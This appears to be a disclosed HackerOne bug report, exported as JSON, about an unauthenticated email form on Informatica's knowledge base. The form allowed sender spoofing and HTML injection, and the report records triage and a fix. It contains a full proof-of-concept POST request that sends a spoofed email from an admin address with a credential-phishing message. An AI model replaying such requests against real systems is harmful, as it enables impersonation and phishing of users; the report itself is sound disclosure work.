{"id":139402,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzk0MDI=","url":"https://hackerone.com/reports/139402","title":"[kb.informatica.com] Unauthenticated emails and HTML injection in email messages","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2016-05-17T18:06:34.804Z","submitted_at":"2016-05-17T18:06:34.804Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"strukt","url":"/strukt","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/303/42cd71a4698d80f88ab65e3117fd9fc401a57048_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":453,"url":"https://hackerone.com/informatica","handle":"informatica","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Informatica","twitter_handle":"informatica","website":"https://www.informatica.com/","about":"Informatica Corporation is the worldâ€™s number one independent provider of data integration software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-11-28T16:35:38.925Z","bug_reporter_agreed_on_going_public_at":"2016-10-29T16:35:36.086Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nThe endpoint at https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=anything is vulnerable to unauthenticated emails, which allows attackers to impersonate anyone and send emails on their behalf.\n\nAlso, the message body field is vulnerable to HTML injection, which allows the attacker to inject \u003ca\u003e and \u003cimg\u003e tags in the message to make it more appealing to the victim.\n\nThe attacker is only able to use all the message parts (subject and body, and spoof the sender email) when the value of the GET parameter \"docid\" is invalid, following is a PoC request:\n\nPOST /_layouts/infa_kb/preview/EmailExtended.aspx?docid=test HTTP/1.1\nHost: kb.informatica.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=test\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 456\n\n__EVENTTARGET=\u0026__EVENTARGUMENT=\u0026__VIEWSTATE=%2FwEPDwUKLTEzODI5NjM1MmRkIAMIwf3AXuDHeZBC%2Bpk%2FVrqUtUo%3D\u0026__VIEWSTATEGENERATOR=D7632FD9\u0026__EVENTVALIDATION=%2FwEWDQKX6trHCgLs0bLrBgLs0fbZDALs0Yq1BQLs0e58AuzRgtgJAuzRxsYPAoznisYGApCjwqsNAs3nv%2BIOAsHFicAHAtPVqd4NAozmy%2BgBxyQ%2FpTxgPj3UtaL60YTEMzWLNM8%3D\u0026TextBox1=strukt93@gmail.com\u0026TextBox2=\u0026TextBox3=\u0026TextBox4=admin@informatica.com\u0026TextBox5=A convincing subject\u0026TextBox6=Hello, please visit \u003ca href=http://www.example.com\u003eOur login page\u003c/a\u003e and enter your credentials to win a reward.\u0026Button1=Submit\n\nThe above request will send an email to strukt93@gmail.com from admin@informatica.com with a message that asks to open a link and enter the user's credentials, which will be really convincing for the user, especially if the attacker has already registered a domain name that looks like Informatica's legit one.\n\nI have attached a screenshot of the mail I received from the above request to make it more clear.\n\nRegards","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThe endpoint at \u003ca title=\"https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=anything\" href=\"/redirect?url=https%3A%2F%2Fkb.informatica.com%2F_layouts%2Finfa_kb%2Fpreview%2FEmailExtended.aspx%3Fdocid%3Danything\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=anything\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is vulnerable to unauthenticated emails, which allows attackers to impersonate anyone and send emails on their behalf.\u003c/p\u003e\n\n\u003cp\u003eAlso, the message body field is vulnerable to HTML injection, which allows the attacker to inject \u0026lt;a\u0026gt; and \u0026lt;img\u0026gt; tags in the message to make it more appealing to the victim.\u003c/p\u003e\n\n\u003cp\u003eThe attacker is only able to use all the message parts (subject and body, and spoof the sender email) when the value of the GET parameter \u0026quot;docid\u0026quot; is invalid, following is a PoC request:\u003c/p\u003e\n\n\u003cp\u003ePOST /_layouts/infa_kb/preview/EmailExtended.aspx?docid=test HTTP/1.1\u003cbr\u003e\nHost: kb.informatica.com\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.8.0\u003cbr\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,\u003cem\u003e/\u003c/em\u003e;q=0.8\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nAccept-Encoding: gzip, deflate\u003cbr\u003e\nReferer: \u003ca title=\"https://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=test\" href=\"/redirect?url=https%3A%2F%2Fkb.informatica.com%2F_layouts%2Finfa_kb%2Fpreview%2FEmailExtended.aspx%3Fdocid%3Dtest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://kb.informatica.com/_layouts/infa_kb/preview/EmailExtended.aspx?docid=test\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nConnection: close\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded\u003cbr\u003e\nContent-Length: 456\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eEVENTTARGET=\u0026amp;\u003c/strong\u003eEVENTARGUMENT=\u0026amp;\u003cstrong\u003eVIEWSTATE=%2FwEPDwUKLTEzODI5NjM1MmRkIAMIwf3AXuDHeZBC%2Bpk%2FVrqUtUo%3D\u0026amp;\u003c/strong\u003eVIEWSTATEGENERATOR=D7632FD9\u0026amp;__EVENTVALIDATION=%2FwEWDQKX6trHCgLs0bLrBgLs0fbZDALs0Yq1BQLs0e58AuzRgtgJAuzRxsYPAoznisYGApCjwqsNAs3nv%2BIOAsHFicAHAtPVqd4NAozmy%2BgBxyQ%2FpTxgPj3UtaL60YTEMzWLNM8%3D\u0026amp;TextBox1=\u003ca title=\"strukt93@gmail.com\" href=\"mailto:strukt93@gmail.com\" rel=\"nofollow noopener noreferrer\"\u003estrukt93@gmail.com\u003c/a\u003e\u0026amp;TextBox2=\u0026amp;TextBox3=\u0026amp;TextBox4=\u003ca title=\"admin@informatica.com\" href=\"mailto:admin@informatica.com\" rel=\"nofollow noopener noreferrer\"\u003eadmin@informatica.com\u003c/a\u003e\u0026amp;TextBox5=A convincing subject\u0026amp;TextBox6=Hello, please visit \u0026lt;a href=http://www.example.com\u0026gt;Our login page\u0026lt;/a\u0026gt; and enter your credentials to win a reward.\u0026amp;Button1=Submit\u003c/p\u003e\n\n\u003cp\u003eThe above request will send an email to \u003ca title=\"strukt93@gmail.com\" href=\"mailto:strukt93@gmail.com\" rel=\"nofollow noopener noreferrer\"\u003estrukt93@gmail.com\u003c/a\u003e from \u003ca title=\"admin@informatica.com\" href=\"mailto:admin@informatica.com\" rel=\"nofollow noopener noreferrer\"\u003eadmin@informatica.com\u003c/a\u003e with a message that asks to open a link and enter the user\u0026#39;s credentials, which will be really convincing for the user, especially if the attacker has already registered a domain name that looks like Informatica\u0026#39;s legit one.\u003c/p\u003e\n\n\u003cp\u003eI have attached a screenshot of the mail I received from the above request to make it more clear.\u003c/p\u003e\n\n\u003cp\u003eRegards\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":94349,"file_name":"Selection_011.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/349/6710155f4f6e35b31113f1ae13c920d2ed8a513b/Selection_011.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_011.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_011.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSFCZ3AEE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042740Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJFMEMCIHWigdtf4V6jrDm66WbPrvAwAjkDkGwq6jJxHgkhTBQkAh8Pm59QJ1DW90Nm%2BqUZrqPeSIGh%2B3OcvgtVLmg10uTMKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgwfS9%2FiGaxXJhRExaMqkQM%2FioQKCRd2GEb49HBlLXjeVg1H%2FoNlCjm1k0hMZ2xM%2B0x4lmIPMnshxiw4gyq5WOKYTVNGzovcoxlJKVWJ0J8ot8jIAdBOEwL1e8YBnNwskpBMy96aUxeRhk0v3RC6PmoKg5jI4Qx3q41XFLoVNJzGZBMLXknGm%2FL%2F3r3TBQO0a%2Bho9Lw4jX%2FmwWvHj8d64twZuZ4naqUS%2FC5%2FMe%2BCb7di7nj2LrLyNCU3mwVZhuZqaKYU7%2BmpmzDXhPe6vg3i0Ag1ETmf%2B4HHFKIzD1arTf4NVMuk53Qk2BUuVm8UMmZQPvicVaLBXLt7ccHpSlZil%2FS4s09xyNkmhqsb4joFjYvki4ZCYJgj6f2HgZ9j5I5jB%2BkNBEx91sV072LTXsJZGus5vwgFqmgq6%2FLSGoCBv5WZ1%2FGuoZfgjyzvsmoBX8uKpu1MK2cCSfK2OOw%2BdQcJ893qtedMSb3E%2FljNUxJf3ge6DsNwKlGjDwu7tV2CwK5eoC8nnGnfgTFitfIQRa0%2BQ7r2Yiwaq1V%2FfpNlnllKKKKFFDD1uar%2FBTrtAcWSVbs%2BpUxv20hwqIlkNrNvMi6wkgf%2BLXOkTSYmrhZJiEvr012n0TMdj9Lpp5lSBvt%2BFmQOWfNxpY3OJBDwcWAiZ%2F2ed9lHQZ21qGQ3nsQfbuRvBliy0SDSXu3rFk%2F2YIvbptRB1WpaAx7N%2FhS0S%2Bs17TOirrod7lqA3UzbN3XBtY1r%2BegR7%2FcG%2BpTuKL1SZFmW4odML8bsKnPb2rSlOtAfW6UI5KEpZRuNPIpftSdXrAErjdLnGLehSWx7Q2Iysd3y2wS8%2BnA6TfU%2Fr7xOl0wvkOaOhwXKDLm%2BA5oHA3Mxg%2F%2FTNCq8BPNgEALt%2FQ%3D%3D\u0026X-Amz-Signature=1332a77afb4b2cdfdb809fbade60eca3a7594bd2a576e426be64f2a437717946","file_size":17141,"type":"image/png"}],"allow_singular_disclosure_at":"2016-11-28T16:35:36.166Z","allow_singular_disclosure_after":-128865124.46177974,"singular_disclosure_allowed":true,"vote_count":3,"voters":["pekafat","madrobot","its_afolic"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":962187,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @strukt,\n\nI have validated that this is working. I will share this with the team.\n\nThank you!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/strukt\"\u003e@strukt\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI have validated that this is working. I will share this with the team.\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-17T21:09:50.153Z","updated_at":"2016-05-17T21:09:50.153Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":962205,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-17T21:24:38.829Z","updated_at":"2016-05-17T21:24:38.829Z","additional_data":{"old_title":"Unauthenticated emails and HTML injection in email messages","new_title":"[kb.informatica.com] Unauthenticated emails and HTML injection in email messages"},"actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1053964,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-05T16:17:16.637Z","updated_at":"2016-07-05T16:17:16.637Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"reporter":{"username":"strukt","url":"/strukt"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1096342,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hello @strukt,\n\nOur team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!\n\nRegards,\nThe Informatica Team","markdown_message":"\u003cp\u003eHello \u003ca href=\"/strukt\"\u003e@strukt\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eOur team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nThe Informatica Team\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-29T20:38:48.448Z","updated_at":"2016-07-29T20:38:48.448Z","actor":{"username":"ttoko","cleared":false,"url":"/ttoko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/347/01c0660d8da33d4b1d468e35562eea9983d24bf3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"strukt","url":"/strukt"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1274340,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose this please ?","markdown_message":"\u003cp\u003eCan we disclose this please ?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-10-29T16:35:36.127Z","updated_at":"2016-10-29T16:35:36.127Z","first_to_agree":true,"actor":{"username":"strukt","cleared":true,"url":"/strukt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/303/42cd71a4698d80f88ab65e3117fd9fc401a57048_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1290412,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"Congratulations! Your bug is eligible for swag. Please make sure your address and shirt size are correct in Hacker One.\n\nThank you!","markdown_message":"\u003cp\u003eCongratulations! Your bug is eligible for swag. Please make sure your address and shirt size are correct in Hacker One.\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-08T19:26:37.193Z","updated_at":"2016-11-08T19:26:37.193Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"reporter":{"username":"strukt","url":"/strukt"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1306857,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ttoko any news about disclosing this ?","markdown_message":"\u003cp\u003e\u003ca href=\"/ttoko\"\u003e@ttoko\u003c/a\u003e any news about disclosing this ?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-18T15:34:51.493Z","updated_at":"2016-11-18T15:34:51.493Z","actor":{"username":"strukt","cleared":true,"url":"/strukt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/303/42cd71a4698d80f88ab65e3117fd9fc401a57048_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1323285,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-28T16:35:38.966Z","updated_at":"2016-11-28T16:35:38.966Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1507229,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-27T05:05:37.287Z","updated_at":"2017-02-27T05:05:37.287Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":28039},"actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}